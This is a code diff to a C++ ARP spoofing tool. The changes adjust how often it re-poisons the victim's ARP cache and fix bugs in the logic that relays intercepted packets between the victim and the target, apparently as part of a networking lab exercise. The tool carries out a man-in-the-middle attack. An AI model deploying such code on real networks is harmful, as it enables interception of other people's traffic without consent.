@@ -58,8 +58,8 @@ void ARPInfectFrequent(
     Ip& target_ip)
 {
     while(true){
-        cout<<"send arp-infect when frequent\n";
-        sleep(5);
+        // cout<<"send arp-infect when frequent\n";
+        sleep(60*5);
         sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
     }
 }
@@ -74,6 +74,7 @@ void ARPRelay(
     Mac& target_mac)
 {
     while(true){
+        cout <<"----\n";
         struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
@@ -85,10 +86,10 @@ void ARPRelay(
         else if (captured_packet->smac_ != sender_mac) continue;
         
         // if captured packet sender -> target, relay it
-        if (captured_packet->type_ == EthHdr::Ip4) {
+        if (captured_packet->type() == EthHdr::Ip4) {
             struct IPv4Hdr* ipv4_hdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
             
-            if (ntohl(ipv4_hdr->ip_src == sender_ip)) {
+            if (ntohl(ipv4_hdr->ip_src) == sender_ip) {
                 cout << "Relaying..\n";
                 captured_packet->smac_ = attacker_mac;
                 captured_packet->dmac_ = target_mac;
